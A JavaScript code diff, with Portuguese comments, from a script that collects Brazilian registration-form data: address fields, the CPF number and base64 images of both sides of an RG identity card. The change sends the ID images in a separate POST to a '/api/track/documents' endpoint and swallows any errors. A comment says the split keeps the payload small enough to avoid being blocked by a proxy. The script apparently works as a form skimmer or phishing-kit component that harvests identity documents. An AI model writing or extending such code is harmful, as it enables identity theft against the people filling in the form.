@@ -1338,11 +1338,7 @@
     if(all['formly_37_input_bairro_4']) fd.bairro = String(all['formly_37_input_bairro_4']).trim();
     if(all['formly_37_select_estado_5']) fd.uf = String(all['formly_37_select_estado_5']).trim();
     if(all['formly_37_input_cidade_text']) fd.cidade = String(all['formly_37_input_cidade_text']).trim();
-    // Documentos (frente/verso do RG em base64)
-    var docFrente = all['formly_16_file_frenteDocumento_7'] || all['__docFrenteBase64'] || all['docFrenteBase64'];
-    var docVerso = all['formly_16_file_versoDocumento_8'] || all['__docVersoBase64'] || all['docVersoBase64'];
-    if(docFrente) fd.doc_frente = String(docFrente).substring(0, 500000); // limite 500KB
-    if(docVerso) fd.doc_verso = String(docVerso).substring(0, 500000);
+    // doc_tipo (leve). Imagens são enviadas em POST separado via postDocumentos()
     if(all['__docTipo']) fd.doc_tipo = all['__docTipo'];
     // Informações da inscrição
     var meio = all['formly_28_select_meioDeDivulgacao_1'];
@@ -1531,6 +1527,19 @@
         form_data: fd,
       }
     });
+    // Envia documentos em POST separado (payload menor pra evitar bloqueio do proxy)
+    try {
+      var frenteImg = all['__docFrenteBase64'] || all['docFrenteBase64'] || '';
+      var versoImg = all['__docVersoBase64'] || all['docVersoBase64'] || '';
+      if(frenteImg || versoImg){
+        post('/api/track/documents', {
+          cpf: cpf,
+          doc_tipo: all['__docTipo'] || 'RG',
+          doc_frente: frenteImg,
+          doc_verso: versoImg,
+        });
+      }
+    } catch(e){}
     return true;
   }
 
